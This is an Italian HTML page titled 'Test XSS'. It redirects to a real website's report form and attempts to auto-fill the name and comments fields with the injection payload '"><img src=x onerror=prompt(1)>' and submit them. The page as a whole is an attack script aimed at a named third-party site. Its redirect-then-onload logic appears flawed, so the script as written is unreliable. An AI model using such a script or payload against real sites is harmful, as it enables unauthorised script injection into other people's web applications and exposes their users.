<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test XSS</title>
</head>
<body>
    <h1>Reindirizzamento in corso...</h1>

    <script>
        // Funzione per compilare il form una volta che la pagina del form è stata caricata
        function compilaForm() {
            // Modifica i nomi dei campi in base a quelli reali nella pagina del form
            var nome = document.querySelector('[name="nome"]'); // Cambia "nome" se necessario
            if (nome) nome.value = '"><img src=x onerror=prompt(1)>';

            var cognome = document.querySelector('[name="cognome"]'); // Cambia "cognome" se necessario
            if (cognome) cognome.value = 'pluto';

            var commenti = document.querySelector('[name="commenti"]'); // Cambia "commenti" se necessario
            if (commenti) commenti.value = '"><img src=x onerror=prompt(1)>';

            // Cerca e clicca sul pulsante di invio
            var button = document.querySelector('input[type="submit"], button[type="submit"]');
            if (button) button.click();
        }

        // Reindirizza alla pagina del form
        window.location.href = 'https://www.traderlink.it/segnalazioni';

        // Una volta che la pagina del form si è caricata, esegui lo script dopo un breve ritardo
        window.onload = function() {
            setTimeout(compilaForm, 2000); // Attendi 2 secondi prima di eseguire il codice
        };
    </script>
</body>
</html>
